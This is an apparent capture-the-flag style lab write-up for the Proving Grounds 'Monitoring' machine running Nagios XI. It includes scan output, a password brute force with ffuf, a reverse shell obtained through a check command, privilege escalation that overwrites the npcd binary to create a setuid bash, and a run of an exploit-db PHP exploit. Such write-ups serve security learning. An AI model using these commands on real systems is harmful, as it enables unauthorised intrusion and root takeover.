---
render_with_liquid: false
title: PG Play  Monitoring
date: 2024-06-11 16:36:18 +1400
tags: [pg-play, nmap, linux, feroxbuster, nagios-xi, brute-force-attack, weak-credentials, ffuf, nagios-xi-2rce, sudo, service-binary-permission, cve-2024-24402]
---



# Learnt / Summary

- Default credentials doesn't work? Google the `default username` and brute force with `default-credentials.txt`

# Recon

## Nmap

```bash

# Nmap 7.94SVN scan initiated Tue Jun 11 16:36:18 2024 as: nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,25,80,389,443,5667, 192.168.239.136
Nmap scan report for 192.168.239.136
Host is up, received user-set (0.066s latency).
Scanned at 2024-06-11 16:36:18 CST for 197s

PORT     STATE SERVICE    REASON         VERSION
22/tcp   open  ssh        syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b8:8c:40:f6:5f:2a:8b:f7:92:a8:81:4b:bb:59:6d:02 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDMqjHxSe8UVPDyihFSjxzMKsqU1gOWFrI7Er+/4I+RstLTBrLn1gIldFGff88zYFOy5EWc37eZR/or/4qU6zMdRItYfbdAkyoBbun3MOM9jucnXobM4qQ2TgFjWK4hLk5Gcee2vFN2msegVoNf4aXvlSolQunD6h5kxhoaZ5vn5ok8RTOHH8PDkdYTKHX5a8SxR1/KQn+9d1l1aJZo05VA7qfs1P6GHMoRgKooKgVrws9ttLS8lb6yoZS8EO2mGhze84/G3KSRXID0YevcSmai0Snx3iAI4DdaFZoMhQDxwsui8L8uJpLYK4MLN2UwkuPWVsogX/PEowweR8QnCNHn
|   256 e7:bb:11:c1:2e:cd:39:91:68:4e:aa:01:f6:de:e6:19 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDxJyi14JgYiOtkyw9tQR9j86Loo9eSElOnBTrO7YeJleiYWENLJxM/T0vYil9yPzWRz/QT/FC2sqOviJiiaBNo=
|   256 0f:8e:28:a7:b7:1d:60:bf:a6:2b:dd:a3:6d:d1:4e:a4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKohQjgFvYRY5+ccAe3zwQ3CjcMFDzoyT3zdAP+lWxc3
25/tcp   open  smtp       syn-ack ttl 61 Postfix smtpd
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
| ssl-cert: Subject: commonName=ubuntu
| Issuer: commonName=ubuntu
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-09-08T17:59:00
| Not valid after:  2030-09-06T17:59:00
| MD5:   e067:1ea3:92c2:ec73:cb21:de0e:73df:cb66
| SHA-1: e39c:c9b6:c35b:b608:3dd0:cd25:e60f:cb61:6551:da77
| -----BEGIN CERTIFICATE-----
| MIICsjCCAZqgAwIBAgIJAMvrYyFKXQezMA0GCSqGSIb3DQEBCwUAMBExDzANBgNV
| BAMMBnVidW50dTAeFw0yMDA5MDgxNzU5MDBaFw0zMDA5MDYxNzU5MDBaMBExDzAN
| BgNVBAMMBnVidW50dTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMfU
| MtszkAvFxmsng/POeWCCF0bcBPmNp6ypRqh1ywyVB6qPlacE8tPM9cDK9t1XPqFz
| +kp7ZHaOlZbk9mvq9ihmvvmlutiM9MhojRMak9oqF5LX9gjhogPRrmKI6FtlrqDn
| 33DsOwNJCxXr2CqwBJeqmIsG5tJDeGoJjXbk9ga68Pwu450fWFH92FL0PTBoXJiV
| 9sjR8wjGyVDn1pTSMQYOIYRe7DrNVsITfLYHL99az2RcjpScOl4KcxV5KVrhsdJk
| wNY4F8g64YkUF/cKCQ4Lbk2KoKkzlq7Z84BFhjujzIwJzulxvaUI+JQELigDKaik
| eyb/iFo12IMCpIhCkV8CAwEAAaMNMAswCQYDVR0TBAIwADANBgkqhkiG9w0BAQsF
| AAOCAQEAVoDANDw/Aqp3SbfYfeRGNkXEZUPSYu3CzvjWG5StwsSOOxjoilae3wiT
| u5Wb3KH61G687ozMsA8kk5BUefGMl77Q74idC++zxwRXPyeCmJ9bEPlusgB2cAKT
| 216skYYuJ0T6xEfeRpY2bQCJMTagb6xzXQmOPC3VZGWX7oxDOTobws9A+eVC/6GK
| hReCKoTkBQU85fFrLxDV7MrQfxs2q+e5f+pXtKW+m4V/3fcrnP16uk6DB9yYO9Im
| mFsOPEhf+/rVjesBWL+5dzscZWcRC6z9OLNkhCYGkya5xrQ7ajCmXdG+G5ZQrOUg
| GO/4fjpxGPhhvZISI71SLM8q2cEcGQ==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
80/tcp   open  http       syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET
|_http-title: Nagios XI
|_http-favicon: Unknown favicon MD5: 8E1494DD4BFF0FC523A2E2A15ED59D84
389/tcp  open  ldap       syn-ack ttl 61 OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http   syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
5667/tcp open  tcpwrapped syn-ack ttl 61
Service Info: Host:  ubuntu; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Tue Jun 11 16:39:35 2024 -- 1 IP address (1 host up) scanned in 196.91 seconds
```


## 80 - HTTP : Nagios XI


### Info

```ruby
http://192.168.239.136 [200] [Nagios XI] [Apache/2.4.18 (Ubuntu)] [4a977f473916682c57e64ea5665d7ca7e697fd23] [Apache HTTP Server:2.4.18,Bootstrap:3,Ubuntu]
```

![](/assets/obsidian/3ccd1b7f40c8ef9f89e1b414aa1a007b.png)

### Directory

```bash
feroxbuster -k -t 100 -u "http://$(pt get rhost)" -o ferox_80.txt
```

```bash
200      GET       40l      234w    14576c http://192.168.239.136/nagiosxi/images/apple-touch-icon.png
200      GET        5l       12w     1073c http://192.168.239.136/nagiosxi/images/favicon.ico
200      GET      177l      116w    17339c http://192.168.239.136/nagiosxi/images/favicon-32x32.png
200      GET      118l      617w    37941c http://192.168.239.136/nagiosxi/images/apple-touch-icon-precomposed.png
200      GET      196l      217w    27444c http://192.168.239.136/nagiosxi/images/nagios_logo_white_transbg.png
200      GET      257l     1794w    14214c http://192.168.239.136/nagiosxi/includes/css/themes/modern.css
200      GET      126l      540w    28976c http://192.168.239.136/nagiosxi/includes/js/core.js
200      GET        2l     1283w    86927c http://192.168.239.136/nagiosxi/includes/js/jquery/jquery-3.3.1.min.js
200      GET      264l     1777w   120968c http://192.168.239.136/nagiosxi/includes/css/bootstrap.3.min.css
200      GET       75l      208w     3245c http://192.168.239.136/index.php
401      GET       14l       54w      462c http://192.168.239.136/nagios/
302      GET        1l        5w       27c http://192.168.239.136/nagiosxi/ => http://192.168.239.136/nagiosxi/login.php?redirect=/nagiosxi/index.php%3f&noauth=1
200      GET     1087l     7750w    63084c http://192.168.239.136/nagiosxi/includes/css/base.css
200      GET       75l      208w     3245c http://192.168.239.136/
```

# Initial Access


## Shell as nagios


### 80 - nagios XI 5.6.0


#### Weak credential (nagiosadmin)

> http://192.168.222.136/nagiosxi/login.php

- Tried some default credentials of `nagios XI`, but they didn't work

- Google : `nagios xi web username`

![](/assets/obsidian/c8f1923a5fd4221752ea6918aba65e60.png)

Brute force default passwords for the username `nagiosadmin`

```bash
ffuf -c --request-proto http -request login.req -w /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt -fs 26139
```

![](/assets/obsidian/99f860b2e57e63016469252bc44d1f45.png)

- Login - `nagiosadmin`:`admin`

![](/assets/obsidian/dfa42f185f6583c573583b910133f0ff.png)

- Identified verseion : `Nagios XI 5.6.0`

#### Admin panel to RCE

To achieve RCE, create a `check command` that runs reverse shell, then run the check command on the target's machine

```bash
nc -lvnp 1111
```

- Configure -> Core config manager -> Add command -> Put reverse shell -> Apply Configuration

![](/assets/obsidian/5dc283ae241f65bbcc2a4212ef5bbb2a.png)

![](/assets/obsidian/1448b21c314bf91838a5e8d260427791.png)

- Configure -> Core config manager -> Monitoring -> Hosts -> Edit `localhost` -> Set `Check command` -> Run Check Command

![](/assets/obsidian/d34b2bdd5f0d0b6e55f0493037c8c9f8.png)

![](/assets/obsidian/517a85273647da7ad46e353f0d3244fc.png)

![](/assets/obsidian/c40080704d322d4df772dd1213f993ed.png)

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/Monitoring]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [192.168.45.221] from (UNKNOWN) [192.168.239.136] 46438
bash: cannot set terminal process group (19435): Inappropriate ioctl for device
bash: no job control in this shell
nagios@ubuntu:/var/spool/cron$ /usr/bin/script -qc /bin/bash /dev/null
/usr/bin/script -qc /bin/bash /dev/null
nagios@ubuntu:/var/spool/cron$ ^Z
zsh: suspended  nc -lvnp 1111

┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/Monitoring]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1111
                               export TERM=xterm
nagios@ubuntu:/var/spool/cron$ stty rows 50 columns 209
nagios@ubuntu:/var/spool/cron$ id
uid=1001(nagios) gid=1001(nagios) groups=1001(nagios),1002(nagcmd)
```

# Privilege Escalation


## From nagios to root


### SUDO + Writeable service binary (CVE-2024-24402)

- Google : `nagios privilege escalation`

> POC - https://github.com/MAWK0235/CVE-2024-24402

> **Brief exploit info**
> An issue in Nagios XI 2024R1.01 allows a remote attacker to escalate privileges via a crafted script to the /usr/local/nagios/bin/npcd component.
{: .prompt-info }

- We can stop/start `npcd` service

```bash
nagios@ubuntu:/var/spool/cron$ sudo -l
Matching Defaults entries for nagios on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nagios may run the following commands on ubuntu:
    (root) NOPASSWD: /etc/init.d/nagios start
    (root) NOPASSWD: /etc/init.d/nagios stop
    (root) NOPASSWD: /etc/init.d/nagios restart
    (root) NOPASSWD: /etc/init.d/nagios reload
    (root) NOPASSWD: /etc/init.d/nagios status
    (root) NOPASSWD: /etc/init.d/nagios checkconfig
    (root) NOPASSWD: /etc/init.d/ndo2db start
    (root) NOPASSWD: /etc/init.d/ndo2db stop
    (root) NOPASSWD: /etc/init.d/ndo2db restart
    (root) NOPASSWD: /etc/init.d/ndo2db reload
    (root) NOPASSWD: /etc/init.d/ndo2db status
    (root) NOPASSWD: /etc/init.d/npcd start
    (root) NOPASSWD: /etc/init.d/npcd stop
    (root) NOPASSWD: /etc/init.d/npcd restart
    (root) NOPASSWD: /etc/init.d/npcd reload
    (root) NOPASSWD: /etc/init.d/npcd status
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/html/includes/components/autodiscovery/scripts/autodiscover_new.php *
    (root) NOPASSWD: /usr/local/nagiosxi/html/includes/components/profile/getprofile.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/change_timezone.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/reset_config_perms.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh *
```

- `npcd`'s binary is located at `/usr/local/nagios/bin/npcd`

```bash
nagios@ubuntu:/var/spool/cron$ cat /etc/init.d/npcd|head -n25

#!/bin/bash

#

### BEGIN INIT INFO

# Provides:          npcd

# Required-Start:

# Required-Stop:

# Default-Start:     2 3 4 5

# Default-Stop:      0 1 6

# Short-Description: Nagios NPCD Initscript

# Description:       Nagios Process Control Daemon

### END INIT INFO


# chkconfig: 345 94 6

#

# Startup script for NPCD

#

# processname: npcd

# pidfile: /usr/local/nagiosxi/var/subsys/npcd.pid

# config: /usr/local/nagios/etc/pnp/npcd.cfg

PREFIX=/usr/local/nagios
BIN=$PREFIX/bin/npcd
CONF=$PREFIX/etc/pnp/npcd.cfg

#PID=/var/run/npcd.pid
PID=/usr/local/nagiosxi/var/subsys/npcd.pid
```

- `nagios` have write access to `/usr/local/nagios/bin/npcd`

```bash
nagios@ubuntu:/var/spool/cron$ ls -la /usr/local/nagios/bin/npcd
-rwxr-xr-- 1 nagios nagios 31664 Sep  8  2020 /usr/local/nagios/bin/npcd
```

Replace `/usr/local/nagios/bin/npcd` to give bash SETUID bits

```bash
nagios@ubuntu:/var/spool/cron$ cp /bin/bash /tmp/b
nagios@ubuntu:/var/spool/cron$ sudo /usr/local/nagiosxi/scripts/manage_services.sh stop npcd
nagios@ubuntu:/var/spool/cron$ echo -e '#!/bin/bash\nchown root /tmp/b; chmod u+s /tmp/b' > /usr/local/nagios/bin/npcd
nagios@ubuntu:/var/spool/cron$ sudo /usr/local/nagiosxi/scripts/manage_services.sh start npcd
Job for npcd.service failed because a configured resource limit was exceeded. See "systemctl status npcd.service" and "journalctl -xe" for details.
nagios@ubuntu:/var/spool/cron$ /tmp/b -p
b-4.3# id
uid=1001(nagios) gid=1001(nagios) euid=0(root) groups=1001(nagios),1002(nagcmd)
b-4.3# $(which python2 python python3 2>/dev/null | head -n1) -c 'import os;os.setuid(0);os.system("/bin/bash -p")'
root@ubuntu:/var/spool/cron# id
uid=0(root) gid=1001(nagios) groups=1001(nagios),1002(nagcmd)
```

# Post Exploitation


## System Proof Screenshot

![](/assets/obsidian/d6607a65d808772e6dec407da0d06f0b.png)

# Appendix


## Shell as root


### Nagios XI 5.6.5 - Root privesc

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/Monitoring]
└─$ searchsploit 'nagios XI escalation'
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                 |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Nagios XI 5.5.6 - Remote Code Execution / Privilege Escalation                                                                                                                 | linux/webapps/46221.py
Nagios XI 5.6.5 - Remote Code Execution / Root Privilege Escalation                                                                                                            | php/webapps/47299.php
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/Monitoring]
└─$ cd exploit

┌──(bravosec㉿fsociety)-[~/…/pg/play/Monitoring/exploit]
└─$ searchsploit -m 47299
  Exploit: Nagios XI 5.6.5 - Remote Code Execution / Root Privilege Escalation
      URL: https://www.exploit-db.com/exploits/47299
     Path: /usr/share/exploitdb/exploits/php/webapps/47299.php
    Codes: N/A
 Verified: False
File Type: PHP script, Unicode text, UTF-8 text, with very long lines (624)
Copied to: /home/kali/Offsec/pg/play/Monitoring/exploit/47299.php
```

> **Errors during exploit run**
> - `PHP Fatal error:  Uncaught Error: Call to undefined function curl_init()`
> - `PHP Fatal error:  Uncaught Error: Class "DOMDocument" not found`
{: .prompt-danger }

Fix :

```bash
sudo apt-get install php-curl php-curl -y
```

```bash
┌──(bravosec㉿fsociety)-[~/…/pg/play/Monitoring/exploit]
└─$ php 47299.php --host=192.168.222.136 --ssl=fale --user=nagiosadmin --pass=admin --reverseip=192.168.45.221 --reverseport=1111
[+] Grabbing NSP from: http://192.168.222.136/nagiosxi/login.php
[+] Retrieved page contents from: http://192.168.222.136/nagiosxi/login.php
[+] Extracted NSP - value: f0999f0abad680c76681f9624cc6279f3a1fbaafce94877c10f8871a9656bd37
[+] Attempting to login...
[+] Authentication success
[+] Checking we have admin rights...
[+] Admin access confirmed
[+] Grabbing NSP from: http://192.168.222.136/nagiosxi/admin/monitoringplugins.php
[+] Retrieved page contents from: http://192.168.222.136/nagiosxi/admin/monitoringplugins.php
[+] Extracted NSP - value: a13735f9b5af194392fe2d5bcef8f437f070366beb3eb4d1bac9e0aa513dc0c5
[+] Uploading payload...
[+] Payload uploaded
[+] Triggering payload: if successful, a reverse shell will spawn at 192.168.45.221:1111
```

```bash
┌──(bravosec㉿fsociety)-[~/…/pg/play/Monitoring/exploit]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [192.168.45.221] from (UNKNOWN) [192.168.222.136] 60792
bash: cannot set terminal process group (944): Inappropriate ioctl for device
bash: no job control in this shell
root@ubuntu:/usr/local/nagiosxi/html/includes/components/profile# id
id
uid=0(root) gid=0(root) groups=0(root)
```